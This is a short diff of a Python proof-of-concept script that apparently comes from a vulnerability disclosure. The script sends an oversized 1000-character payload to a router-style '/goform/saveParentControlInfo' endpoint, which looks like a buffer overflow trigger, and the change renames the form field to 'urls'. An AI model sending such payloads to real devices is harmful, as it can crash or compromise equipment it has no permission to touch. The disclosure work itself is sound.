@@ -30,7 +30,7 @@ ip = "192.168.84.101"
 url = "http://" + ip + "/goform/saveParentControlInfo"
 payload = b"a"*1000
 
-data = {"u": payload}
+data = {"urls": payload}
 response = requests.post(url, data=data)
 print(response.text)
 ```
